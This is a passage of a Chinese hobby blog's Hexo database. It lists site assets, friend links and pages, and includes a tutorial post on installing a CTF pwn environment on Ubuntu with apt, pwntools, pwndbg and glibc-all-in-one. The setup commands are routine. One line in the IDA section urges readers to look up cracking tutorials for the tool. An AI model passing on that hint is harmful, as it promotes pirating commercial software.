ef35f9913a56b32eafde72a9fe901","modified":1760449476506},{"_id":"source/images/background/狐妖/010.jpg","hash":"285cd5710f639eeaebbb184ef1e7abcfd9d9bbee","modified":1760449822384},{"_id":"source/images/background/狐妖/019.jpg","hash":"80fb58151302866550e12395ab7828e460e09b4b","modified":1760450026290},{"_id":"source/images/background/狐妖/07.jpg","hash":"19bff45c7afd153fd0225e31aa7935ddb542e8cb","modified":1760449751962},{"_id":"source/images/background/狐妖/18.jpg","hash":"beaebdb60af9aa6a944c979db25289d0e99bc2f1","modified":1760449901777},{"_id":"source/images/background/狐妖/19.jpeg","hash":"de3693ebf1bc432ffefd675b87242a94f58f877b","modified":1760449962371},{"_id":"source/images/background/狐妖/21.jpg","hash":"1de7a2c9a483f69836d09ffe5a6a47d36db2256f","modified":1760450074578},{"_id":"source/images/background/狐妖/05.jpg","hash":"6c747d5dac868268cacd2a2d743426fa54307a2a","modified":1760449355048},{"_id":"source/images/background/狐妖/14.png","hash":"798191b64774cac01b911f65b9931c441e20a4d6","modified":1760449661663},{"_id":"source/images/background/狐妖/021.jpg","hash":"f99ff1cefe8ee9cbed326fef76e9d1ce72d8e8c9","modified":1760450129404},{"_id":"source/images/background/狐妖/12.jpg","hash":"ba1e8f4f8be895680d64f486c233118bd8ec9ab3","modified":1760449639701},{"_id":"source/images/background/狐妖/22.jpg","hash":"d854e2890a6d3f101d950bc3064016506e4b1099","modified":1760450116634},{"_id":"source/images/background/狐妖/016.jpg","hash":"50fbb24840a646eaa047572b6ca6a3bd940dd06f","modified":1760449949985},{"_id":"source/images/background/狐妖/7.jpg","hash":"8da0431baa79532a4efe5c2d7efe3ff01176c1ab","modified":1760449451168},{"_id":"source/images/background/狐妖/06.jpg","hash":"c53767f491db7f396ee0550ee18bff5a474dcb8c","modified":1760449624758},{"_id":"source/images/background/狐妖/8.png","hash":"7aad6564cc02700ae0abaa1b040ccc80125d872d","modified":1760449460041},{"_id":"public/2025/10/14/VS中Avalonia框架配置.html","hash":"729cf6d7a10b5ba41b0d703694dcb2f4b8bc6d19","modified":1762523499822},{"_id":"public/images/background/狐妖/012.webp","hash":"a177106bf78e3f4ae60e223ccbdd30b61ae4a5c3","modified":1760453983304},{"_id":"public/images/background/狐妖/014.webp","hash":"b5d1f6e99b7ec60d5b3dfe196a5a17ae79b8e233","modified":1760453983304},{"_id":"public/images/background/狐妖/011.webp","hash":"7f1678042e6a09886a403e628e58158b9a677581","modified":1760453983304},{"_id":"public/images/background/狐妖/013.webp","hash":"b216456726d5161d0f2793871023048aeee5cb48","modified":1760453983304},{"_id":"public/images/background/狐妖/018.jpg","hash":"40690fcc29842199f74148e36628bf7e1b6f7811","modified":1760453983304},{"_id":"public/images/background/狐妖/022.webp","hash":"a0b69c61f0cbc5371f9c383e874ba0c0a43a55c7","modified":1760453983304},{"_id":"public/images/background/狐妖/11.webp","hash":"d27c822ea7dfc2e064b2cc5f1030250a1d5ddc8c","modified":1760453983304},{"_id":"public/images/background/狐妖/10.webp","hash":"d9e733a8652a184e11b0aed43612a20483bb80fd","modified":1760453983304},{"_id":"public/images/background/狐妖/13.webp","hash":"f9f05b040a92c9d84bbc54a9a280a08d771aec80","modified":1760453983304},{"_id":"public/images/background/狐妖/16.webp","hash":"2e0b68c2db40755f3b7cc6cda50269f9e6fda853","modified":1760453983304},{"_id":"public/images/background/狐妖/15.webp","hash":"75816ea80faa4085c4a9b016f9e8cb277ac72655","modified":1760453983304},{"_id":"public/images/background/狐妖/17.webp","hash":"56fdf346f1083fefb010f18d90bc94d6c6cd294b","modified":1760453983304},{"_id":"public/images/background/狐妖/015.jpg","hash":"c10ce3b33984a9ad4b47c49d744443234dc4e11a","modified":1760453983304},{"_id":"public/images/background/狐妖/017.jpg","hash":"94634259e312790a0f76da8eb9a480d8f4334f7a","modified":1760453983304},{"_id":"public/images/background/狐妖/023.jpg","hash":"d21924beb4c0a9fb65df45b33ff2b63cd535ad47","modified":1760453983304},{"_id":"public/images/background/狐妖/020.jpg","hash":"5ee1b15d3a8514222121d68c677e795e609e4f91","modified":1760453983304},{"_id":"public/images/background/狐妖/09.jpg","hash":"a12884e9c5048a3ab1be45645d3214d060904816","modified":1760453983304},{"_id":"public/images/background/狐妖/08.jpg","hash":"c58311680512c91bfbbd8209ead2292ff0f5792c","modified":1760453983304},{"_id":"public/images/background/狐妖/23.jpg","hash":"5b3ff976235086c9872be9b796cbbb794f682012","modified":1760453983304},{"_id":"public/images/background/狐妖/5.jpg","hash":"d41ed25835353b2575d4d128f439d6ee44277b79","modified":1760453983304},{"_id":"public/images/background/狐妖/6.jpg","hash":"1faf1951db4db33a9853f165761a6798ca4acf99","modified":1760453983304},{"_id":"public/images/background/狐妖/9.jpg","hash":"8f3620d2417ef35f9913a56b32eafde72a9fe901","modified":1760453983304},{"_id":"public/images/background/狐妖/010.jpg","hash":"285cd5710f639eeaebbb184ef1e7abcfd9d9bbee","modified":1760453983304},{"_id":"public/images/background/狐妖/019.jpg","hash":"80fb58151302866550e12395ab7828e460e09b4b","modified":1760453983304},{"_id":"public/images/background/狐妖/07.jpg","hash":"19bff45c7afd153fd0225e31aa7935ddb542e8cb","modified":1760453983304},{"_id":"public/images/background/狐妖/18.jpg","hash":"beaebdb60af9aa6a944c979db25289d0e99bc2f1","modified":1760453983304},{"_id":"public/images/background/狐妖/19.jpeg","hash":"de3693ebf1bc432ffefd675b87242a94f58f877b","modified":1760453983304},{"_id":"public/images/background/狐妖/21.jpg","hash":"1de7a2c9a483f69836d09ffe5a6a47d36db2256f","modified":1760453983304},{"_id":"public/images/background/狐妖/05.jpg","hash":"6c747d5dac868268cacd2a2d743426fa54307a2a","modified":1760453983304},{"_id":"public/images/background/狐妖/14.png","hash":"798191b64774cac01b911f65b9931c441e20a4d6","modified":1760453983304},{"_id":"public/images/background/狐妖/021.jpg","hash":"f99ff1cefe8ee9cbed326fef76e9d1ce72d8e8c9","modified":1760453983304},{"_id":"public/images/background/狐妖/12.jpg","hash":"ba1e8f4f8be895680d64f486c233118bd8ec9ab3","modified":1760453983304},{"_id":"public/images/background/狐妖/22.jpg","hash":"d854e2890a6d3f101d950bc3064016506e4b1099","modified":1760453983304},{"_id":"public/images/background/狐妖/016.jpg","hash":"50fbb24840a646eaa047572b6ca6a3bd940dd06f","modified":1760453983304},{"_id":"public/images/background/狐妖/7.jpg","hash":"8da0431baa79532a4efe5c2d7efe3ff01176c1ab","modified":1760453983304},{"_id":"public/images/background/狐妖/06.jpg","hash":"c53767f491db7f396ee0550ee18bff5a474dcb8c","modified":1760453983304},{"_id":"public/images/background/狐妖/8.png","hash":"7aad6564cc02700ae0abaa1b040ccc80125d872d","modified":1760453983304},{"_id":"source/_posts/0xGame2025Week2WP.md","hash":"569af2aa1b395c1d40255a231fbc5b8e851ae305","modified":1760844905170},{"_id":"source/images/wp/eval.png","hash":"af1fa782cc8da28ca53f972699ee240c158ede4d","modified":1760442151852},{"_id":"public/2025/10/19/0xGame2025Week2WP.html","hash":"9db23d85ff23f6ddc9e8ad2bbe6ee712579792b8","modified":1762523499822},{"_id":"public/page/2/index.html","hash":"13b34cb609320282a17a6e45cda573cb8e2033fb","modified":1762523694606},{"_id":"public/archives/page/2/index.html","hash":"1af6eab00f9b84a851faa44bf62179cb861fcadd","modified":1762523694606},{"_id":"public/archives/2025/page/2/index.html","hash":"85e707991751870f595149c9fa9ed6a139ba6be3","modified":1762523694606},{"_id":"public/images/wp/eval.png","hash":"af1fa782cc8da28ca53f972699ee240c158ede4d","modified":1760842451725},{"_id":"source/images/wp/shuffle.png","hash":"bbef9dbd79937dcc29142aff69779b5741b226de","modified":1760346498357},{"_id":"public/images/wp/shuffle.png","hash":"bbef9dbd79937dcc29142aff69779b5741b226de","modified":1760843825224},{"_id":"source/images/background/white.jpg","hash":"4b8bff6bc1198f9200c5388697a1ce04940828c7","modified":1761739381400},{"_id":"public/images/background/white.jpg","hash":"4b8bff6bc1198f9200c5388697a1ce04940828c7","modified":1761739663811},{"_id":"source/_posts/0xGame2025Week3WP.md","hash":"96004d7e46b030ac68c1101b824b260f540424ca","modified":1762522868322},{"_id":"public/2025/11/07/0xGame2025Week3WP.html","hash":"4d6a7c440f33ac4ee0d5715fdd35272d68a6aded","modified":1762523499822},{"_id":"public/archives/2025/11/index.html","hash":"cf37541c614b15b81c6959eb999f519cf024b959","modified":1762523694606}],"Category":[{"name":"pwn","_id":"cmeut9edn0004kot8euwrbqyp"},{"name":"C#","_id":"cmf22vtiw0001lwt8a0hj4kgb"},{"name":"Csharp","_id":"cmf24pwpi0000rst8aqjic802"}],"Data":[{"_id":"link","data":[{"class_name":"友情链接","class_desc":"那些人，那些事","link_list":[{"name":"zer00ne","link":"https://khighl.github.io/","avatar":"/images/background/01.jpg","descr":"ctfer&pwn 世界上最好的mentor ˶╹ꇴ╹˶ 01"},{"name":"s3loy","link":"https://blog.s3loy.tech/","avatar":"https://blog.s3loy.tech/images/1.jpg","descr":"The great Linux pioneer."},{"name":"🦊的小屋","link":"https://blog.jagdender.ink/","avatar":"https://blog.jagdender.ink/image/avatar.jpg","descr":"最喜欢吃小孩的🦊"},{"name":"SeanDictionary","link":"https://seandictionary.top/","avatar":"https://seandictionary.top/wp-content/uploads/2024/09/哭哭_透明.png","descr":"SeanDictionary | 折腾日记"},{"name":"Max","link":"http://maxqian.me/zh-cn/","avatar":"/images/background/max.jpg","descr":"全栈神"},{"name":"spreng","link":"https://spreng.top/","avatar":"/images/background/spreng.jpg","descr":"Re大手子"},{"name":"soapsama","link":"https://soapsama.cn/","avatar":"https://cdn.jsdelivr.net/gh/soapsama7/cdn_img@latest/post/avatar.jpg","descr":"Yume konSeki"},{"name":"Pure Stream","link":"https://marblue.pink/","avatar":"https://marblue.pink/img/purestream.jpg","descr":"web | miHoYo！！"}]}]}],"Page":[{"title":"about","date":"2025-08-28T02:28:42.000Z","top_img":"/images/00.png","_content":"## About Me\nHello! I'm futurefe, I love exploring new technologies and sharing my knowledge with the community.\n实力有限，会分享一些比较基础的东西，希望能帮到大家。 🥰\n🎯 25荔枝学pwn✨✨\n\n","source":"about/index.md","raw":"---\ntitle: about\ndate: 2025-08-28 10:28:42\ntop_img: /images/00.png\n---\n## About Me\nHello! I'm futurefe, I love exploring new technologies and sharing my knowledge with the community.\n实力有限，会分享一些比较基础的东西，希望能帮到大家。 🥰\n🎯 25荔枝学pwn✨✨\n\n","updated":"2025-09-22T05:43:54.094Z","path":"about/index.html","_id":"cmeut9edg0000kot8hzv96brs","comments":1,"layout":"page","content":"<h2 id=\"About-Me\"><a href=\"#About-Me\" class=\"headerlink\" title=\"About Me\"></a>About Me</h2><p>Hello! I’m futurefe, I love exploring new technologies and sharing my knowledge with the community.<br>实力有限，会分享一些比较基础的东西，希望能帮到大家。 🥰<br>🎯 25荔枝学pwn✨✨</p>\n","excerpt":"","more":"<h2 id=\"About-Me\"><a href=\"#About-Me\" class=\"headerlink\" title=\"About Me\"></a>About Me</h2><p>Hello! I’m futurefe, I love exploring new technologies and sharing my knowledge with the community.<br>实力有限，会分享一些比较基础的东西，希望能帮到大家。 🥰<br>🎯 25荔枝学pwn✨✨</p>\n"},{"title":"友情链接","date":"2025-08-26T16:00:00.000Z","type":"link","layout":"page","top_img":"/images/fr.jpg","_content":"\n# 欢迎大佬来玩 😋\n","source":"link/index.md","raw":"---\ntitle: 友情链接\ndate: 2025-08-27\ntype: \"link\"\nlayout: page\ntop_img: /images/fr.jpg\n---\n\n# 欢迎大佬来玩 😋\n","updated":"2025-09-22T05:58:06.031Z","path":"link/index.html","_id":"cmeut9edl0002kot8bdredlgm","comments":1,"content":"<h1 id=\"欢迎大佬来玩-😋\"><a href=\"#欢迎大佬来玩-😋\" class=\"headerlink\" title=\"欢迎大佬来玩 😋\"></a>欢迎大佬来玩 😋</h1>","excerpt":"","more":"<h1 id=\"欢迎大佬来玩-😋\"><a href=\"#欢迎大佬来玩-😋\" class=\"headerlink\" title=\"欢迎大佬来玩 😋\"></a>欢迎大佬来玩 😋</h1>"},{"title":"标签","date":"2018-01-04T16:00:00.000Z","type":"tags","orderby":"random","order":1,"top_img":"/images/background/阴阳师/04.jpg","_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 2018-01-05 00:00:00\ntype: 'tags'\norderby: random\norder: 1\ntop_img: /images/background/阴阳师/04.jpg \n---\n","updated":"2025-09-22T05:53:04.172Z","path":"tags/index.html","_id":"cmeut9edo0006kot80vgmfm4k","comments":1,"layout":"page","content":"","excerpt":"","more":""},{"title":"music","top_img":"/images/bk.jpg","_content":"<!-- 网易云音乐 -->\n{% meting \"464916877\" \"netease\" \"song\" \"autoplay\" \"mutex:false\" \"listmaxheight:400px\" \"preload:none\" \"theme:#ad7a86\"%}\n\n<!-- 分隔线 -->\n<div style=\"margin: 20px 0; border-top: 1px solid #eee;\"></div>\n\n<!-- KTV录音 -->\n<h3>KTV 录音</h3>\n\n<!-- 第一首音乐 -->\n<div style=\"margin-bottom: 15px;\">\n  <p>漫漫</p>\n  <audio controls style=\"width: 100%;\">\n    <source src=\"/audio/漫漫.mp3\" type=\"audio/mpeg\">\n    您的浏览器不支持音频播放\n  </audio>\n</div>\n\n<!-- 第二首音乐 -->\n<div style=\"margin-bottom: 15px;\">\n  <p>不如见一面</p>\n  <audio controls style=\"width: 100%;\">\n    <source src=\"/audio/不如见一面.mp3\" type=\"audio/mpeg\">\n    您的浏览器不支持音频播放\n  </audio>\n</div>\n\n<!-- 第三首音乐 -->\n<div style=\"margin-bottom: 15px;\">\n  <p>梦一场</p>\n  <audio controls style=\"width: 100%;\">\n    <source src=\"/audio/梦一场.mp3\" type=\"audio/mpeg\">\n    您的浏览器不支持音频播放\n  </audio>\n</div>\n\n<!-- 第四首音乐 -->\n<div style=\"margin-bottom: 15px;\">\n  <p>唯一</p>\n  <audio controls style=\"width: 100%;\">\n    <source src=\"/audio/唯一.mp3\" type=\"audio/mpeg\">\n    您的浏览器不支持音频播放\n  </audio>\n</div>","source":"music/index.md","raw":"---\ntitle: music\ntop_img: /images/bk.jpg\n---\n<!-- 网易云音乐 -->\n{% meting \"464916877\" \"netease\" \"song\" \"autoplay\" \"mutex:false\" \"listmaxheight:400px\" \"preload:none\" \"theme:#ad7a86\"%}\n\n<!-- 分隔线 -->\n<div style=\"margin: 20px 0; border-top: 1px solid #eee;\"></div>\n\n<!-- KTV录音 -->\n<h3>KTV 录音</h3>\n\n<!-- 第一首音乐 -->\n<div style=\"margin-bottom: 15px;\">\n  <p>漫漫</p>\n  <audio controls style=\"width: 100%;\">\n    <source src=\"/audio/漫漫.mp3\" type=\"audio/mpeg\">\n    您的浏览器不支持音频播放\n  </audio>\n</div>\n\n<!-- 第二首音乐 -->\n<div style=\"margin-bottom: 15px;\">\n  <p>不如见一面</p>\n  <audio controls style=\"width: 100%;\">\n    <source src=\"/audio/不如见一面.mp3\" type=\"audio/mpeg\">\n    您的浏览器不支持音频播放\n  </audio>\n</div>\n\n<!-- 第三首音乐 -->\n<div style=\"margin-bottom: 15px;\">\n  <p>梦一场</p>\n  <audio controls style=\"width: 100%;\">\n    <source src=\"/audio/梦一场.mp3\" type=\"audio/mpeg\">\n    您的浏览器不支持音频播放\n  </audio>\n</div>\n\n<!-- 第四首音乐 -->\n<div style=\"margin-bottom: 15px;\">\n  <p>唯一</p>\n  <audio controls style=\"width: 100%;\">\n    <source src=\"/audio/唯一.mp3\" type=\"audio/mpeg\">\n    您的浏览器不支持音频播放\n  </audio>\n</div>","date":"2025-09-22T13:33:52.723Z","updated":"2025-09-22T13:33:52.723Z","path":"music/index.html","_id":"cmeut9edq0008kot8ho144mdo","comments":1,"layout":"page","content":"<!-- 网易云音乐 -->\n\n    <div id=\"aplayer-ClBtzhge\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"464916877\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"false\" data-listmaxheight=\"400px\" data-preload=\"none\" data-theme=\"#ad7a86\"\n    ></div>\n\n<!-- 分隔线 -->\n<div style=\"margin: 20px 0; border-top: 1px solid #eee;\"></div>\n\n<!-- KTV录音 -->\n<h3>KTV 录音</h3>\n\n<!-- 第一首音乐 -->\n<div style=\"margin-bottom: 15px;\">\n  <p>漫漫</p>\n  <audio controls style=\"width: 100%;\">\n    <source src=\"/audio/漫漫.mp3\" type=\"audio/mpeg\">\n    您的浏览器不支持音频播放\n  </audio>\n</div>\n\n<!-- 第二首音乐 -->\n<div style=\"margin-bottom: 15px;\">\n  <p>不如见一面</p>\n  <audio controls style=\"width: 100%;\">\n    <source src=\"/audio/不如见一面.mp3\" type=\"audio/mpeg\">\n    您的浏览器不支持音频播放\n  </audio>\n</div>\n\n<!-- 第三首音乐 -->\n<div style=\"margin-bottom: 15px;\">\n  <p>梦一场</p>\n  <audio controls style=\"width: 100%;\">\n    <source src=\"/audio/梦一场.mp3\" type=\"audio/mpeg\">\n    您的浏览器不支持音频播放\n  </audio>\n</div>\n\n<!-- 第四首音乐 -->\n<div style=\"margin-bottom: 15px;\">\n  <p>唯一</p>\n  <audio controls style=\"width: 100%;\">\n    <source src=\"/audio/唯一.mp3\" type=\"audio/mpeg\">\n    您的浏览器不支持音频播放\n  </audio>\n</div>","excerpt":"","more":"<!-- 网易云音乐 -->\n\n    <div id=\"aplayer-ClBtzhge\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"464916877\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"false\" data-listmaxheight=\"400px\" data-preload=\"none\" data-theme=\"#ad7a86\"\n    ></div>\n\n<!-- 分隔线 -->\n<div style=\"margin: 20px 0; border-top: 1px solid #eee;\"></div>\n\n<!-- KTV录音 -->\n<h3>KTV 录音</h3>\n\n<!-- 第一首音乐 -->\n<div style=\"margin-bottom: 15px;\">\n  <p>漫漫</p>\n  <audio controls style=\"width: 100%;\">\n    <source src=\"/audio/漫漫.mp3\" type=\"audio/mpeg\">\n    您的浏览器不支持音频播放\n  </audio>\n</div>\n\n<!-- 第二首音乐 -->\n<div style=\"margin-bottom: 15px;\">\n  <p>不如见一面</p>\n  <audio controls style=\"width: 100%;\">\n    <source src=\"/audio/不如见一面.mp3\" type=\"audio/mpeg\">\n    您的浏览器不支持音频播放\n  </audio>\n</div>\n\n<!-- 第三首音乐 -->\n<div style=\"margin-bottom: 15px;\">\n  <p>梦一场</p>\n  <audio controls style=\"width: 100%;\">\n    <source src=\"/audio/梦一场.mp3\" type=\"audio/mpeg\">\n    您的浏览器不支持音频播放\n  </audio>\n</div>\n\n<!-- 第四首音乐 -->\n<div style=\"margin-bottom: 15px;\">\n  <p>唯一</p>\n  <audio controls style=\"width: 100%;\">\n    <source src=\"/audio/唯一.mp3\" type=\"audio/mpeg\">\n    您的浏览器不支持音频播放\n  </audio>\n</div>"},{"title":"分类","date":"2018-01-04T16:00:00.000Z","type":"categories","top_img":"/images/bl.jpg","_content":"","source":"categories/index.md","raw":"---\ntitle: 分类\ndate: 2018-01-05 00:00:00\ntype: 'categories'\ntop_img: /images/bl.jpg\n---\n","updated":"2025-09-22T05:51:34.828Z","path":"categories/index.html","_id":"cmeut9eds0009kot8g8taft3v","comments":1,"layout":"page","content":"","excerpt":"","more":""}],"Post":[{"title":"Day 01 pwn环境配置","date":"2025-08-26T16:00:00.000Z","top_img":"/images/background/00.jpg","cover":"/images/background/bkimg.jpg","_content":"# Ubuntu 下 Pwn 环境配置\n\nPwn 是 CTF（Capture The Flag）竞赛中的重要方向，主要涉及二进制漏洞利用，而一套完善的 Pwn 环境是开展 Pwn 学习和竞赛的基础。本教程将带领大家在 Ubuntu 系统中，通过一系列命令逐步完成 Pwn 环境的配置，涵盖基础依赖库、工具安装以及关键辅助工具部署，即使是新手也能轻松跟随操作。\n\n## 一、环境配置前的准备\n\n在开始配置 Pwn 环境前，请确保你的 Ubuntu 系统处于正常联网状态，因为后续所有操作都需要通过网络下载相关软件包和工具。同时，建议以具有 sudo 权限的用户登录系统，避免因权限不足导致命令执行失败。打开 Ubuntu 的终端（可以通过快捷键`Ctrl + Alt + T`快速调出），接下来我们将分四个步骤执行命令完成配置。\n\n## 二、分步执行命令配置环境\n\n### 步骤 1：安装基础依赖库与常用工具\n\n这一步是环境配置的基础，我们需要更新系统软件源并升级已安装的软件，同时安装编译工具、编程语言环境、文本编辑器、调试工具以及必要的库文件，这些工具和库文件将为后续 Pwn 工具的安装和使用提供支持。\n\n在终端中粘贴以下命令并回车执行（命令较长，粘贴时确保完整，执行过程中可能需要输入当前用户的密码，输入密码时终端不会显示字符，正常输入即可）：\n\n\n\n```shell\nsudo apt update && sudo apt upgrade -y\n\nsudo apt install -y build-essential gcc g++ make cmake git curl wget unzip \\\n\n      python3 python3-pip python3-venv \\\n\n      vim gdb gdb-multiarch tmux patchelf \\\n\n      libc6-dev-i386 libc6-dbg libc6-dbg:i386 \\\n\n      lib32z1 lib32ncurses6 lib32stdc++6\n```\n\n\n\n*   `sudo apt update`：用于更新 Ubuntu 系统的软件源列表，让系统知道最新的软件版本信息。\n\n*   `sudo apt upgrade -y`：根据更新后的软件源列表，升级系统中已安装的软件，`-y`参数表示自动确认所有升级操作，无需手动输入`y`确认。\n\n*   `sudo apt install -y`：用于安装指定的软件包，`-y`参数同样是自动确认安装操作。后面紧跟的一系列软件包中，`build-essential`是编译工具集，`gcc`、`g++`是 C 和 C++ 编译器，`python3`及相关组件是 Python 环境，`vim`是文本编辑器，`gdb`系列是调试工具，`libc6`相关库文件则是为了支持 32 位程序的运行和调试。\n\n### 步骤 2：安装 Pwn 核心工具 ——pwntools\n\npwntools 是 Pwn 方向最常用的 Python 库，它集成了大量用于二进制文件分析、漏洞利用的功能，能够极大提高 Pwn 操作的效率。我们提供了三种安装方式，大家可以根据自己的情况选择，推荐优先尝试前两种，若遇到网络问题可尝试第三种国内源安装方式。\n\n#### 方式一：通过 pip3 直接安装（推荐优先尝试）\n\n在终端粘贴以下命令并执行：\n\n\n\n```shell\npip3 install --upgrade pip\n\npip3 install pwntools\n```\n\n\n\n*   `pip3 install --upgrade pip`：先将 pip3（Python 的包管理工具）升级到最新版本，确保后续安装 pwntools 时不会因 pip 版本过低出现问题。\n\n*   `pip3 install pwntools`：使用 pip3 安装 pwntools 库。\n\n#### 方式二：通过 apt 包管理器安装\n\n若方式一安装失败，可尝试此方式，在终端粘贴命令：\n\n\n\n```shell\nsudo apt install python3-pwntools\n```\n\n这种方式通过 Ubuntu 官方软件源安装，稳定性较高，但可能不是最新版本。\n\n#### 方式三：通过国内清华源安装（解决网络问题）\n\n如果在安装过程中遇到网络超时、下载速度慢等问题，可使用国内的清华 PyPI 源进行安装，在终端粘贴：\n\n\n\n```shell\npip install -i https://pypi.tuna.tsinghua.edu.cn/simple pwntools\n```\n\n`-i https://pypi.tuna.tsinghua.edu.cn/simple`参数指定了使用清华的 PyPI 源，能有效提高国内用户的下载速度。\n\n### 步骤 3：安装增强型调试工具 ——pwndbg\n\ngdb 是常用的调试工具，但默认功能较为基础，pwndbg 是 gdb 的一个增强插件，它添加了彩色显示、自动加载调试符号、便捷的调试命令等功能，能让 Pwn 调试过程更加高效。\n\n#### 第一步：克隆 pwndbg 仓库\n\n首先需要从 GitHub 上克隆 pwndbg 的代码仓库到本地，在终端粘贴以下命令（若第一个链接克隆速度慢，可使用第二个国内镜像链接）：\n\n\n\n```shell\n# 方式一：官方GitHub链接\n\ngit clone https://github.com/pwndbg/pwndbg\n\n# 方式二：国内镜像链接（推荐国内用户使用）\n\ngit clone https://gitclone.com/github.com/pwndbg/pwndbg.git\n```\n\n`git clone`命令用于从远程代码仓库克隆代码到本地，执行后会在当前终端所在目录下生成一个名为`pwndbg`的文件夹，里面包含 pwndbg 的所有代码。\n\n#### 第二步：进入 pwndbg 目录并执行安装脚本\n\n克隆完成后，需要进入 pwndbg 文件夹，然后执行安装脚本进行安装，在终端依次粘贴以下命令：\n\n\n\n```shell\ncd pwndbg\n\n./setup.sh\n```\n\n\n\n*   `cd pwndbg`：进入刚刚克隆生成的 pwndbg 目录，只有进入该目录才能执行后续的安装脚本。\n\n*   `./setup.sh`：执行 pwndbg 的安装脚本，该脚本会自动安装 pwndbg 所需的依赖，并完成 gdb 插件的配置。\n\n#### 安装过程中的特殊处理（若出现依赖安装失败问题）\n\n如果在执行`./setup.sh`时遇到依赖安装失败的情况，可尝试先通过国内源安装 uv 工具（用于依赖管理），再进行依赖同步，在终端粘贴以下命令：\n\n\n\n```shell\npip install -i https://pypi.tuna.tsinghua.edu.cn/simple uv  --break-system-packages\n\nuv sync --index-url https://mirrors.aliyun.com/pypi/simple/\n```\n\n执行完成后，再次运行`./setup.sh`即可继续完成 pwndbg 的安装。\n\n### 步骤 4：安装多版本 glibc 集合 ——glibc-all-in-one\n\n在 Pwn 题目中，不同的题目可能依赖不同版本的 glibc（GNU C 库），而系统默认的 glibc 版本固定，无法满足多种版本需求。glibc-all-in-one 是一个整合了多种常见版本 glibc 的工具集，安装后可以方便地为不同题目切换对应的 glibc 版本，避免因 glibc 版本不匹配导致题目无法运行或调试。\n\n在终端粘贴以下命令进行安装：\n\n\n\n```shell\ngit clone https://github.com/matrix1001/glibc-all-in-one.git \\~/glibc-all-in-one\n```\n\n\n\n*   `git clone https://github.com/matrix1001/glibc-all-in-one.git`：克隆 glibc-all-in-one 的代码仓库。\n\n*   `~/glibc-all-in-one`：指定将仓库克隆到当前用户的家目录（`~`代表家目录）下的`glibc-all-in-one`文件夹中，这样后续查找和使用该工具集会更加方便。\n\n## 三、环境配置验证\n\n完成以上所有步骤后，我们可以通过简单的操作验证环境是否配置成功：\n\n\n\n1.  **验证 pwntools**：在终端输入`python3`进入 Python 交互环境，然后输入`from pwn import *`，若没有报错，则说明 pwntools 安装成功。\n\n2.  **验证 pwndbg**：在终端输入`gdb`，若进入 gdb 界面后显示有`pwndbg`相关的提示信息（如彩色的版本号、欢迎语等），则说明 pwndbg 配置成功。\n\n3.  **验证 glibc-all-in-one**：进入家目录，查看是否存在`glibc-all-in-one`文件夹，进入该文件夹后若能看到包含不同 glibc 版本的文件，则说明安装成功。\n\n\n\n# IDA安装\n\nIDA是帮助我们分析二进制文件的工具，可以自行上网找找破解教程（\n\n> ","source":"_posts/Day 01 pwn环境配置.md","raw":"---\ntitle: Day 01 pwn环境配置\ndate: 2025-08-27\ntags: \n\n  - ubuntu\n  - pwntools\n  - pwndbg\n  - python\ncategories: pwn\ntop_img: /images/background/00.jpg\ncover: /images/background/bkimg.jpg\n---\n# Ubuntu 下 Pwn 环境配置\n\nPwn 是 CTF（Capture The Flag）竞赛中的重要方向，主要涉及二进制漏洞利用，而一套完善的 Pwn 环境是开展 Pwn 学习和竞赛的基础。本教程将带领大家在 Ubuntu 系统中，通过一系列命令逐步完成 Pwn 环境的配置，涵盖基础依赖库、工具安装以及关键辅助工具部署，即使是新手也能轻松跟随操作。\n\n## 一、环境配置前的准备\n\n在开始配置 Pwn 环境前，请确保你的 Ubuntu 系统处于正常联网状态，因为后续所有操作都需要通过网络下载相关软件包和工具。同时，建议以具有 sudo 权限的用户登录系统，避免因权限不足导致命令执行失败。打开 Ubuntu 的终端（可以通过快捷键`Ctrl + Alt + T`快速调出），接下来我们将分四个步骤执行命令完成配置。\n\n## 二、分步执行命令配置环境\n\n### 步骤 1：安装基础依赖库与常用工具\n\n这一步是环境配置的基础，我们需要更新系统软件源并升级已安装的软件，同时安装编译工具、编程语言环境、文本编辑器、调试工具以及必要的库文件，这些工具和库文件将为后续 Pwn 工具的安装和使用提供支持。\n\n在终端中粘贴以下命令并回车执行（命令较长，粘贴时确保完整，执行过程中可能需要输入当前用户的密码，输入密码时终端不会显示字符，正常输入即可）：\n\n\n\n```shell\nsudo apt update && sudo apt upgrade -y\n\nsudo apt install -y build-essential gcc g++ make cmake git curl wget unzip \\\n\n      python3 python3-pip python3-venv \\\n\n      vim gdb gdb-multiarch tmux patchelf \\\n\n      libc6-dev-i386 libc6-dbg libc6-dbg:i386 \\\n\n      lib32z1 lib32ncurses6 lib32stdc++6\n```\n\n\n\n*   `sudo apt update`：用于更新 Ubuntu 系统的软件源列表，让系统知道最新的软件版本信息。\n\n*   `sudo apt upgrade -y`：根据更新后的软件源列表，升级系统中已安装的软件，`-y`参数表示自动确认所有升级操作，无需手动输入`y`确认。\n\n*   `sudo apt install -y`：用于安装指定的软件包，`-y`参数同样是自动确认安装操作。后面紧跟的一系列软件包中，`build-essential`是编译工具集，`gcc`、`g++`是 C 和 C++ 编译器，`python3`及相关组件是 Python 环境，`vim`是文本编辑器，`gdb`系列是调试工具，`libc6`相关库文件则是为了支持 32 位程序的运行和调试。\n\n### 步骤 2：安装 Pwn 核心工具 ——pwntools\n\npwntools 是 Pwn 方向最常用的 Python 库，它集成了大量用于二进制文件分析、漏洞利用的功能，能够极大提高 Pwn 操作的效率。我们提供了三种安装方式，大家可以根据自己的情况选择，推荐优先尝试前两种，若遇到网络问题可尝试第三种国内源安装方式。\n\n#### 方式一：通过 pip3 直接安装（推荐优先尝试）\n\n在终端粘贴以下命令并执行：\n\n\n\n```shell\npip3 install --upgrade pip\n\npip3 install pwntools\n```\n\n\n\n*   `pip3 install --upgrade pip`：先将 pip3（Python 的包管理工具）升级到最新版本，确保后续安装 pwntools 时不会因 pip 版本过低出现问题。\n\n*   `pip3 install pwntools`：使用 pip3 安装 pwntools 库。\n\n#### 方式二：通过 apt 包管理器安装\n\n若方式一安装失败，可尝试此方式，在终端粘贴命令：\n\n\n\n```shell\nsudo apt install python3-pwntools\n```\n\n这种方式通过 Ubuntu 